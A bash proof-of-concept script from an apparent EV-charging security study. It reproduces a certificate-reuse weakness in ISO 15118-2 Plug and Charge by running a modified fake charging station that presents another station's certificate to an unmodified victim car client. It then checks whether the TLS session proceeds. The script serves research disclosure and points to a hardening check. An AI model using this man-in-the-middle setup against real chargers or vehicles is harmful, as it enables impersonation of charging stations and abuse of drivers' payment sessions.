#!/usr/bin/env bash
# 50-pki-cert-reuse-mitm.sh - reproduce the certificate-reuse weakness from
# the CCS PKI measurement study (arXiv:2404.06635, section 5.3):
# a charging-station certificate issued to station A is accepted by a car
# connected to station B, because the car has no expected-station input to
# check the presented certificate against.
#
# Setup: the PoC-modified fake SECC presents the secc2 ("compromised station")
# certificate; the unmodified victim EVCC connects, validates the chain
# against the V2G root - and accepts, although the certificate belongs to a
# DIFFERENT station (CN SECCCert2 vs the expected SECCCert). In the relay
# attack (40-*) this is what lets the fake station pass TLS at all.
#
# Run AFTER scripts/40-relay-attack-josev.sh has built $HOME/pnc-relay, or
# pass the workdir used there.
set -euo pipefail

WORK="${1:-$HOME/pnc-relay}"
TIMEOUT=45
cd "$WORK"

[[ -d venv-poc && -d venv-honest ]] || { echo "Run scripts/40-relay-attack-josev.sh first (builds venvs + PKI)."; exit 1; }

LOGS="$WORK/logs/mitm-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$LOGS"
SHARED="$WORK/shared-mitm"
rm -rf "$SHARED" && mkdir -p "$SHARED"

cleanup() { jobs -p | xargs -r kill 2>/dev/null || true; }
trap cleanup EXIT

echo "== Starting fake SECC (presents secc2 = the compromised station's cert) on br-pnc-b"
cd "$SHARED"
NETWORK_INTERFACE=br-pnc-b AUTH_MODES=PNC \
  "$WORK/venv-poc/bin/python" -m iso15118.secc.main > "$LOGS/secc-fake.log" 2>&1 &
sleep 3

echo "== Starting unmodified victim EVCC on br-pnc-b"
NETWORK_INTERFACE=br-pnc-b EVCC_CONFIG_PATH="$WORK/honest/evcc_config_pnc.json" \
  "$WORK/venv-honest/bin/python" "$WORK/honest/iso15118/evcc/main.py" > "$LOGS/evcc-victim.log" 2>&1 &

for _ in $(seq "$TIMEOUT"); do
  if grep -q 'PaymentDetails\|SessionSetupRes\|ServiceDiscoveryRes' "$LOGS/evcc-victim.log" 2>/dev/null; then
    break
  fi
  sleep 1
done

echo
echo "===================== RESULT ====================="
if grep -q 'ServiceDiscoveryRes\|PaymentDetails' "$LOGS/evcc-victim.log" 2>/dev/null; then
  echo "WEAKNESS CONFIRMED: the car completed TLS and continued the ISO 15118-2"
  echo "session with a station certificate that was issued to a DIFFERENT station"
  echo "(same V2G root). The car had no way to notice."
else
  echo "Session did not progress within ${TIMEOUT}s - inspect $LOGS"
fi
echo
echo "Certificate identities for the paper's figure:"
openssl x509 -in "$WORK/honest/iso15118/shared/pki/iso15118_2/certs/seccLeafCert.pem" -noout -subject  | sed 's/^/  honest station:  /'
openssl x509 -in "$WORK/honest/iso15118/shared/pki/iso15118_2/certs/secc2LeafCert.pem" -noout -subject | sed 's/^/  presented cert:  /'
echo
echo "Defense check (PKI hardening profile, docs/pki-hardening-profile.md):"
echo "  a car that pins the presented cert's CN/EVSE-ID to the expected station"
echo "  rejects this session. Prototype check: measurement/verify_attack_invariant.py --scenario pki"
